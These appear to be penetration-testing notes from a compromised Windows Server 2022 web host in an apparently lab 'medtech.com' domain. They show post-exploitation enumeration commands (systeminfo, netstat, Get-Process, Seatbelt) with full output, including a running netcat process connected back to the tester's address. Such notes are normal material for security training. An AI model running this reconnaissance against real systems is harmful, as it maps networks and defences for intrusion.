```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
```
displayname                                                            
-----------                                                            
                                                                       
Microsoft Edge                                                         
Microsoft Edge Update                                                  
Microsoft Help Viewer 2.3                                              
                                                                       
Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.28.29913     
Microsoft SQL Server Management Studio - 18.12.1                       
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.28.29913         
Browser for SQL Server 2019                                            
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.28.29913            
Microsoft Visual C++ 2013 x86 Minimum Runtime - 12.0.40664             
Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29913     
Microsoft Analysis Services OLE DB Provider                            
Microsoft Visual Studio Tools for Applications 2017 x86 Hosting Support
Integration Services                                                   
Microsoft Help Viewer 2.3                                              
Microsoft Visual C++ 2013 Redistributable (x86) - 12.0.40664           
Visual Studio 2017 Isolated Shell for SSMS                             
Microsoft Visual C++ 2013 x86 Additional Runtime - 12.0.40664          
Microsoft Visual Studio Tools for Applications 2017   
```
- Group enumeration
```
whoami /groups
```
```
GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Monitor Users    Alias            S-1-5-32-558 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT SERVICE\ALL SERVICES              Well-known group S-1-5-80-0   Mandatory group, Enabled by default, Enabled group

```
- Systeminfo
```
systeminfo
```
```
Host Name:                 WEB02
OS Name:                   Microsoft Windows Server 2022 Standard
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00454-10000-00001-AA354
Original Install Date:     9/29/2022, 12:56:59 AM
System Boot Time:          3/28/2024, 9:00:52 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~3094 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,090 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 2,732 MB
Virtual Memory: In Use:    2,067 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    medtech.com
Logon Server:              N/A
Hotfix(s):                 4 Hotfix(s) Installed.
                           [01]: KB5017265
                           [02]: KB5012170
                           [03]: KB5017316
                           [04]: KB5016704
Network Card(s):           2 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.250.121
                           [02]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet1
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 172.16.250.254
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

```
- IPconfig
```
ipconfig /all
```
```
Windows IP Configuration

   Host Name . . . . . . . . . . . . : WEB02
   Primary Dns Suffix  . . . . . . . : dmz.medtech.com
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : Yes
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : dmz.medtech.com
                                       medtech.com

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-86-9F-AE
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 192.168.250.121(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.250.254
   NetBIOS over Tcpip. . . . . . . . : Enabled

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #2
   Physical Address. . . . . . . . . : 00-50-56-86-26-46
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 172.16.250.254(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 
   DNS Servers . . . . . . . . . . . : 172.16.250.10
   NetBIOS over Tcpip. . . . . . . . : Enabled

```
- Routes
```
route print
```
```
===========================================================================
Interface List
  2...00 50 56 86 9f ae ......vmxnet3 Ethernet Adapter
  5...00 50 56 86 26 46 ......vmxnet3 Ethernet Adapter #2
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0  192.168.250.254  192.168.250.121     16
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
     172.16.250.0    255.255.255.0         On-link    172.16.250.254    271
   172.16.250.254  255.255.255.255         On-link    172.16.250.254    271
   172.16.250.255  255.255.255.255         On-link    172.16.250.254    271
    192.168.250.0    255.255.255.0         On-link   192.168.250.121    271
  192.168.250.121  255.255.255.255         On-link   192.168.250.121    271
  192.168.250.255  255.255.255.255         On-link   192.168.250.121    271
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link   192.168.250.121    271
        224.0.0.0        240.0.0.0         On-link    172.16.250.254    271
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link   192.168.250.121    271
  255.255.255.255  255.255.255.255         On-link    172.16.250.254    271
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0  192.168.250.254       1
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  1    331 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None

```
- Active Connections
```
netstat -ano
```
```
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       924
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       708
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       576
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1204
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1576
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       708
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       2176
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       2060
  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       692
  TCP    172.16.250.254:139     0.0.0.0:0              LISTENING       4
  TCP    172.16.250.254:52977   172.16.250.10:135      TIME_WAIT       0
  TCP    172.16.250.254:52978   172.16.250.10:49668    TIME_WAIT       0
  TCP    172.16.250.254:54649   0.0.0.0:0              LISTENING       6364
  TCP    192.168.250.121:139    0.0.0.0:0              LISTENING       4
  TCP    192.168.250.121:8888   192.168.45.170:51490   ESTABLISHED     5244
  TCP    192.168.250.121:52961  23.102.129.60:443      TIME_WAIT       0
  TCP    192.168.250.121:52983  184.150.154.89:80      SYN_SENT        5980
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       924
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       708
  TCP    [::]:49665             [::]:0                 LISTENING       576
  TCP    [::]:49666             [::]:0                 LISTENING       1204
  TCP    [::]:49667             [::]:0                 LISTENING       1576
  TCP    [::]:49668             [::]:0                 LISTENING       708
  TCP    [::]:49669             [::]:0                 LISTENING       2176
  TCP    [::]:49670             [::]:0                 LISTENING       2060
  TCP    [::]:49671             [::]:0                 LISTENING       692
  TCP    [::1]:52976            [::1]:5985             TIME_WAIT       0
  TCP    [::1]:52979            [::1]:5985             TIME_WAIT       0
  UDP    0.0.0.0:123            *:*                                    664
  UDP    0.0.0.0:162            *:*                                    5012
  UDP    0.0.0.0:500            *:*                                    2068
  UDP    0.0.0.0:4500           *:*                                    2068
  UDP    0.0.0.0:5353           *:*                                    1140
  UDP    0.0.0.0:5355           *:*                                    1140
  UDP    0.0.0.0:51044          *:*                                    1140
  UDP    0.0.0.0:53521          *:*                                    1140
  UDP    0.0.0.0:56788          *:*                                    1140
  UDP    127.0.0.1:1900         *:*                                    5004
  UDP    127.0.0.1:49933        127.0.0.1:49933                        3148
  UDP    127.0.0.1:50163        127.0.0.1:50163                        708
  UDP    127.0.0.1:50543        127.0.0.1:50543                        2076
  UDP    127.0.0.1:53009        *:*                                    5004
  UDP    127.0.0.1:53011        127.0.0.1:53011                        1352
  UDP    127.0.0.1:65377        127.0.0.1:65377                        1408
  UDP    172.16.250.254:137     *:*                                    4
  UDP    172.16.250.254:138     *:*                                    4
  UDP    172.16.250.254:1900    *:*                                    5004
  UDP    172.16.250.254:53008   *:*                                    5004
  UDP    192.168.250.121:137    *:*                                    4
  UDP    192.168.250.121:138    *:*                                    4
  UDP    192.168.250.121:1900   *:*                                    5004
  UDP    192.168.250.121:53007  *:*                                    5004
  UDP    [::]:123               *:*                                    664
  UDP    [::]:162               *:*                                    5012
  UDP    [::]:500               *:*                                    2068
  UDP    [::]:4500              *:*                                    2068
  UDP    [::]:53521             *:*                                    1140
  UDP    [::]:56788             *:*                                    1140
  UDP    [::1]:1900             *:*                                    5004
  UDP    [::1]:53006            *:*                                    5004

```
- Running Processes
```
Get-Process
```
```
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
-------  ------    -----      -----     ------     --  -- -----------                                                  
     91       5      888       4620              3504   0 AggregatorHost                                               
    127      10     1372       7400              6364   0 alg                                                          
    102       8     2732       5956       0.06   6584   0 cmd                                                          
     73       5     2256       4064       0.02   7460   0 cmd                                                          
    116       8     6336      11184       0.03   7568   0 conhost                                                      
    633      23     1968       6412               452   0 csrss                                                        
    292      14     1976       6292               552   1 csrss                                                        
    368      15     3300      15296              5252   1 ctfmon                                                       
    276      15     3880      14536              3848   0 dllhost                                                      
    760      32    22592      51112               916   1 dwm                                                          
   1605      61    26480      91712              5704   1 explorer                                                     
     39       6     1632       4480               840   1 fontdrvhost                                                  
     39       6     1584       4096               848   0 fontdrvhost                                                  
    168      11     4028       9592              2468   0 gisvc                                                        
      0       0       60          8                 0   0 Idle                                                         
   1457      33     7396      23412               708   0 lsass                                                        
    207      13     1844       4100              5124   0 MicrosoftEdgeUpdate                                          
    424      21     4312      19120              5980   0 MicrosoftEdgeUpdate                                          
    203      13     1920      11968              6852   0 MicrosoftEdgeUpdate                                          
    236      13     2768      10808              3288   0 msdtc                                                        
    617      86   175076     123792              2884   0 MsMpEng                                                      
    124      10     1224       5768       0.02   5244   0 nc                                                           
    652      33    54044      64500       2.41   6540   0 powershell                                                   
      0      14     2468      23340               100   0 Registry                                                     
    335      19    20592      40480              4124   1 RuntimeBroker                                                
    160      10     2288      14632              6112   1 RuntimeBroker                                                
    226      13     2352      13572              6300   1 RuntimeBroker                                                
    191      11     2444      16500              7128   1 RuntimeBroker                                                
    688      35    32148      66352              4276   1 SearchApp                                                    
    690      14     5344      13860               692   0 services                                                     
    596      27    10068      46380              7008   1 ShellExperienceHost                                          
    526      16     5072      26700              4592   1 sihost                                                       
     57       3     1080       1288               328   0 smss                                                         
    103       9     1088       4808              5012   0 snmptrap                                                     
    454      22     5640      17012              2176   0 spoolsv                                                      
    725      32    61336      71180              5048   0 sqlceip                                                      
    586      63   243216     148928              2232   0 sqlservr                                                     
    819      53   413860     312544       2.56   5056   0 sqlservr                                                     
    141      10     1816       8240              2616   0 sqlwriter                                                    
    135      10     1644       8420              6996   0 sqlwriter                                                    
    583      27    13616      54788              5992   1 StartMenuExperienceHost                                      
    226      14     2664      11944               348   0 svchost                                                      
    370      16     4444      13984               396   0 svchost                                                      
    215      13     1712       8004               664   0 svchost                                                      
    111       8     1292       5692               720   0 svchost                                                      
    132      18     3752       8004               764   0 svchost                                                      
    213      12     1960      10064               780   0 svchost                                                      
   1079      20     7152      23884               816   0 svchost                                                      
    990      16     5644      12548               924   0 svchost                                                      
    246      11     2084       8372               984   0 svchost                                                      
    260      13     4460      12188              1020   0 svchost                                                      
    171      10     1624      12196              1052   0 svchost                                                      
    222      10     1988       7212              1108   0 svchost                                                      
    310      16     3312      10224              1140   0 svchost                                                      
    453      14    17284      21012              1204   0 svchost                                                      
    427      33     8348      18056              1316   0 svchost                                                      
    389      16     4528      13632              1352   0 svchost                                                      
    299      17     2968      13788              1408   0 svchost                                                      
    206      11     2292      11728              1436   0 svchost                                                      
    150       7     1188       5884              1444   0 svchost                                                      
    449      10     3032       9340              1452   0 svchost                                                      
    478      14     3040      11132              1520   0 svchost                                                      
    383      18     4816      15664              1576   0 svchost                                                      
    172      10     1864       8628              1592   0 svchost                                                      
    284      11     1956       9060              1636   0 svchost                                                      
    138      78     1688       7200              1684   0 svchost                                                      
    197      13     2068      12944              1724   0 svchost                                                      
    139       7     1304       6112              1744   0 svchost                                                      
    138       9     1560       7120              1784   0 svchost                                                      
    171       9     1992       7720              1904   0 svchost                                                      
    210      12     2056       9284              1912   0 svchost                                                      
    117       8     1516       6272              2008   0 svchost                                                      
    162      12     1644       7488              2060   0 svchost                                                      
    268      14     2604       8376              2068   0 svchost                                                      
    376      16     2904      12016              2076   0 svchost                                                      
    201      10     2220       9168              2192   0 svchost                                                      
    167      12     3960      11312              2324   0 svchost                                                      
    111       8     1124       5784              2336   0 svchost                                                      
    257      26     3352      13340              2356   0 svchost                                                      
    533      23    16424      33564              2396   0 svchost                                                      
    145      42     1628       7108              2476   0 svchost                                                      
    202      11     2288       8976              2560   0 svchost                                                      
    159       9     4132      12212              2572   0 svchost                                                      
    188      11     2464      15476              2632   1 svchost                                                      
    132       8     1488       6736              2640   0 svchost                                                      
    127       8     1212       5740              2688   0 svchost                                                      
    240      15     4556      12440              2792   0 svchost                                                      
    449      18    13092      24684              2832   0 svchost                                                      
    130       8     1468      11736              2876   0 svchost                                                      
    234      13     2812      12000              2924   0 svchost                                                      
    118       8     1320       7244              3008   0 svchost                                                      
    687      38     6680      20800              3148   0 svchost                                                      
    424      20     4564      17688              3560   0 svchost                                                      
    186      15     6044      10740              3580   0 svchost                                                      
    386      18     6276      30792              3760   1 svchost                                                      
    205      13     2332      11800              4236   0 svchost                                                      
    291      16    12304      15176              4288   0 svchost                                                      
    298      21     8844      16208              4376   0 svchost                                                      
    309      16     4004      17556              4460   0 svchost                                                      
    279      14     3484      15524              4616   1 svchost                                                      
    221      15     1924       7668              5004   0 svchost                                                      
    164       9     1496       7680              5204   0 svchost                                                      
    235      12     2920      15316              5344   0 svchost                                                      
    159      10     1960      10848              5560   0 svchost                                                      
    235      13     2576      13428              5604   0 svchost                                                      
    112       8     1476       6400              5652   0 svchost                                                      
    120       8     1492       7296              5880   0 svchost                                                      
    478      29     9552      22464              6124   0 svchost                                                      
    375      18     7164      16972              6720   0 svchost                                                      
    177      12     2508      14796              8148   0 svchost                                                      
   2373       0       36        136                 4   0 System                                                       
    178      11     2144      11884              3960   1 taskhostw                                                    
    527      22     9888      42408              5964   1 TextInputHost                                                
    174      11     2836      11512              2732   0 VGAuthService                                                
    120       8     1424       6392              2764   0 vm3dservice                                                  
    119       9     1524       6852              3036   1 vm3dservice                                                  
    119       9     1508       6852              4660   1 vm3dservice                                                  
    426      25    10864      25232              2748   0 vmtoolsd                                                     
    256      18     5136      17980              6936   1 vmtoolsd                                                     
    809      37    56676      50624              5072   0 w3wp                                                         
    151      11     1372       7120               576   0 wininit                                                      
    257      12     2436      12868               612   1 winlogon                                                     
    475      23    12104      27704              3720   0 WmiPrvSE  
```
- Seatbelt.exe
```
seatbelt.exe -group=all
```
```
                        %&&@@@&&                                                                                  
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%                         
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################                        
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
                        &%%&&&%%%%%        v1.2.1         ,(((&%%%%%%%%%%%%%%%%%,                                 
                         #%%%%##,                                                                                 


====== AMSIProviders ======

  GUID                           : {2781761E-28E0-4109-99FE-B9D127C57AFE}
  ProviderPath                   : "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MpOav.dll"

====== AntiVirus ======

Cannot enumerate antivirus. root\SecurityCenter2 WMI namespace is not available on Windows Servers
====== AppLocker ======

  [*] AppIDSvc service is Stopped

    [*] Applocker is not running because the AppIDSvc is not running

  [*] AppLocker not configured
====== ARPTable ======

  Loopback Pseudo-Interface 1 --- Index 1
    Interface Description : Software Loopback Interface 1
    Interface IPs      : ::1, 127.0.0.1
    DNS Servers        : fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1

    Internet Address      Physical Address      Type
    224.0.0.22            00-00-00-00-00-00     Static
    239.255.255.250       00-00-00-00-00-00     Static


  Ethernet0 --- Index 2
    Interface Description : vmxnet3 Ethernet Adapter
    Interface IPs      : 192.168.250.121
    Internet Address      Physical Address      Type
    192.168.250.254       00-50-56-86-D1-66     Dynamic
    192.168.250.255       FF-FF-FF-FF-FF-FF     Static
    224.0.0.22            01-00-5E-00-00-16     Static
    224.0.0.251           01-00-5E-00-00-FB     Static
    224.0.0.252           01-00-5E-00-00-FC     Static
    239.255.255.250       01-00-5E-7F-FF-FA     Static


  Ethernet1 --- Index 5
    Interface Description : vmxnet3 Ethernet Adapter #2
    Interface IPs      : 172.16.250.254
    DNS Servers        : 172.16.250.10

    Internet Address      Physical Address      Type
    172.16.250.10         00-50-56-86-A5-E1     Dynamic
    172.16.250.11         00-50-56-86-EE-9A     Dynamic
    172.16.250.12         00-50-56-86-99-8A     Dynamic
    172.16.250.13         00-50-56-86-8F-43     Dynamic
    172.16.250.14         00-50-56-86-23-5D     Dynamic
    172.16.250.82         00-50-56-86-4F-1F     Dynamic
    172.16.250.83         00-50-56-86-07-B7     Dynamic
    172.16.250.255        FF-FF-FF-FF-FF-FF     Static
    224.0.0.22            01-00-5E-00-00-16     Static
    224.0.0.251           01-00-5E-00-00-FB     Static
    224.0.0.252           01-00-5E-00-00-FC     Static
    239.255.255.250       01-00-5E-7F-FF-FA     Static


====== AuditPolicies ======

====== AuditPolicyRegistry ======

====== AutoRuns ======


  HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run :
    C:\Windows\system32\SecurityHealthSystray.exe
    "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
====== Certificates ======

====== CertificateThumbprints ======

CurrentUser\Root - 92B46C76E13054E104F230517E6E504D43AB10B5 (Symantec Enterprise Mobile Root for Microsoft) 3/14/2032 4:59:59 PM
CurrentUser\Root - 8F43288AD272F3103B6FB1428485EA3014C0BCFE (Microsoft Root Certificate Authority 2011) 3/22/2036 3:13:04 PM
CurrentUser\Root - 3B1EFD3A66EA28B16697394703A72CA340A05BD5 (Microsoft Root Certificate Authority 2010) 6/23/2035 3:04:01 PM
CurrentUser\Root - 31F9FC8BA3805986B721EA7295C65B3A44534274 (Microsoft ECC TS Root Certificate Authority 2018) 2/27/2043 1:00:12 PM
CurrentUser\Root - 06F1AA330B927B753A40E68CDF22E34BCBEF3352 (Microsoft ECC Product Root Certificate Authority 2018) 2/27/2043 12:50:46 PM
CurrentUser\Root - 0119E81BE9A14CD8E22F40AC118C687ECBA3F4D8 (Microsoft Time Stamp Root Certificate Authority 2014) 10/22/2039 3:15:19 PM
CurrentUser\Root - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
CurrentUser\Root - D69B561148F01C77C54578C10926DF5B856976AD (GlobalSign) 3/18/2029 3:00:00 AM
CurrentUser\Root - D4DE20D05E66FC53FE1A50882C78DB2852CAE474 (Baltimore CyberTrust Root) 5/12/2025 4:59:00 PM
CurrentUser\Root - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 3:59:59 PM
CurrentUser\Root - CABD2A79A1076A31F21D253635CB039D4329A5E8 (ISRG Root X1) 6/4/2035 4:04:38 AM
CurrentUser\Root - B31EB1B740E36C8402DADC37D44DF5D4674952F9 (Entrust Root Certification Authority) 11/27/2026 12:53:42 PM
CurrentUser\Root - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 4:00:00 AM
CurrentUser\Root - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 10:39:16 AM
CurrentUser\Root - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
CurrentUser\Root - 9F744E9F2B4DBAEC0F312C50B6563B8E2D93C311 (COMODO ECC Certification Authority) 1/18/2038 3:59:59 PM
CurrentUser\Root - 8CF427FD790C3AD166068DE81E57EFBB932272D4 (Entrust Root Certification Authority - G2) 12/7/2030 9:55:54 AM
CurrentUser\Root - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
CurrentUser\Root - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/9/2031 4:00:00 PM
CurrentUser\Root - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 4:59:59 PM
CurrentUser\Root - 2B8F1B57330DBBA2D07A6C51F70EE90DDAB9AD8E (USERTrust RSA Certification Authority) 1/18/2038 3:59:59 PM
CurrentUser\Root - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 10:06:20 AM
CurrentUser\Root - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
LocalMachine\Root - 92B46C76E13054E104F230517E6E504D43AB10B5 (Symantec Enterprise Mobile Root for Microsoft) 3/14/2032 4:59:59 PM
LocalMachine\Root - 8F43288AD272F3103B6FB1428485EA3014C0BCFE (Microsoft Root Certificate Authority 2011) 3/22/2036 3:13:04 PM
LocalMachine\Root - 3B1EFD3A66EA28B16697394703A72CA340A05BD5 (Microsoft Root Certificate Authority 2010) 6/23/2035 3:04:01 PM
LocalMachine\Root - 31F9FC8BA3805986B721EA7295C65B3A44534274 (Microsoft ECC TS Root Certificate Authority 2018) 2/27/2043 1:00:12 PM
LocalMachine\Root - 06F1AA330B927B753A40E68CDF22E34BCBEF3352 (Microsoft ECC Product Root Certificate Authority 2018) 2/27/2043 12:50:46 PM
LocalMachine\Root - 0119E81BE9A14CD8E22F40AC118C687ECBA3F4D8 (Microsoft Time Stamp Root Certificate Authority 2014) 10/22/2039 3:15:19 PM
LocalMachine\Root - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
LocalMachine\Root - D69B561148F01C77C54578C10926DF5B856976AD (GlobalSign) 3/18/2029 3:00:00 AM
LocalMachine\Root - D4DE20D05E66FC53FE1A50882C78DB2852CAE474 (Baltimore CyberTrust Root) 5/12/2025 4:59:00 PM
LocalMachine\Root - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 3:59:59 PM
LocalMachine\Root - CABD2A79A1076A31F21D253635CB039D4329A5E8 (ISRG Root X1) 6/4/2035 4:04:38 AM
LocalMachine\Root - B31EB1B740E36C8402DADC37D44DF5D4674952F9 (Entrust Root Certification Authority) 11/27/2026 12:53:42 PM
LocalMachine\Root - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 4:00:00 AM
LocalMachine\Root - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 10:39:16 AM
LocalMachine\Root - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
LocalMachine\Root - 9F744E9F2B4DBAEC0F312C50B6563B8E2D93C311 (COMODO ECC Certification Authority) 1/18/2038 3:59:59 PM
LocalMachine\Root - 8CF427FD790C3AD166068DE81E57EFBB932272D4 (Entrust Root Certification Authority - G2) 12/7/2030 9:55:54 AM
LocalMachine\Root - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
LocalMachine\Root - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/9/2031 4:00:00 PM
LocalMachine\Root - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 4:59:59 PM
LocalMachine\Root - 2B8F1B57330DBBA2D07A6C51F70EE90DDAB9AD8E (USERTrust RSA Certification Authority) 1/18/2038 3:59:59 PM
LocalMachine\Root - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 10:06:20 AM
LocalMachine\Root - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
CurrentUser\CertificateAuthority - FEE449EE0E3965A5246F000E87FDE2A065FD89D4 (Root Agency) 12/31/2039 3:59:59 PM
LocalMachine\CertificateAuthority - FEE449EE0E3965A5246F000E87FDE2A065FD89D4 (Root Agency) 12/31/2039 3:59:59 PM
CurrentUser\AuthRoot - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
CurrentUser\AuthRoot - D69B561148F01C77C54578C10926DF5B856976AD (GlobalSign) 3/18/2029 3:00:00 AM
CurrentUser\AuthRoot - D4DE20D05E66FC53FE1A50882C78DB2852CAE474 (Baltimore CyberTrust Root) 5/12/2025 4:59:00 PM
CurrentUser\AuthRoot - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 3:59:59 PM
CurrentUser\AuthRoot - CABD2A79A1076A31F21D253635CB039D4329A5E8 (ISRG Root X1) 6/4/2035 4:04:38 AM
CurrentUser\AuthRoot - B31EB1B740E36C8402DADC37D44DF5D4674952F9 (Entrust Root Certification Authority) 11/27/2026 12:53:42 PM
CurrentUser\AuthRoot - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 4:00:00 AM
CurrentUser\AuthRoot - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 10:39:16 AM
CurrentUser\AuthRoot - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
CurrentUser\AuthRoot - 9F744E9F2B4DBAEC0F312C50B6563B8E2D93C311 (COMODO ECC Certification Authority) 1/18/2038 3:59:59 PM
CurrentUser\AuthRoot - 8CF427FD790C3AD166068DE81E57EFBB932272D4 (Entrust Root Certification Authority - G2) 12/7/2030 9:55:54 AM
CurrentUser\AuthRoot - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
